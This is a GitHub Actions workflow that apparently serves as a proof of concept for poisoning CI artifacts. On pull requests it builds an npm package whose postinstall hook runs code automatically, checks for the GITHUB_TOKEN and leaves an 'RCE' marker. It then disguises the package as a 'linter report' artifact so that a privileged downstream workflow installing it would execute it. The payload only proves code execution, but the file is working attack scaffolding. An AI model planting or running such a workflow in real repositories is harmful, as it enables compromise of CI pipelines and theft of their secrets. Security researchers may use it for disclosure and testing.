name: Lint
on:
  pull_request:
    branches: [main]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build report and malicious npm payload
        run: |
          mkdir -p payload pkg
          cat > pkg/package.json <<'JSON'
          {"name":"lint-util","version":"1.0.0","scripts":{"postinstall":"node post.js"}}
          JSON
          cat > pkg/post.js <<'JS'
          const fs = require('fs');
          console.log('RCE_CONFIRMED_IN_WORKFLOW_RUN', new Date().toISOString());
          console.log('GITHUB_TOKEN_PRESENT', Boolean(process.env.GITHUB_TOKEN));
          fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/rce_marker.txt', 'rce');
          JS
          (cd pkg && npm pack --silent >/dev/null)
          cp pkg/lint-util-1.0.0.tgz payload/
          cat > payload/package.json <<'JSON'
          {"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"lint-util":"file:./lint-util-1.0.0.tgz"},"allowScripts":{"lint-util":true}}
          JSON
          echo "${{ github.event.pull_request.number }}" > payload/pr-number.txt
          printf 'Attacker controlled report\n' > payload/linter-report.txt
          ls -la payload
      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: payload/
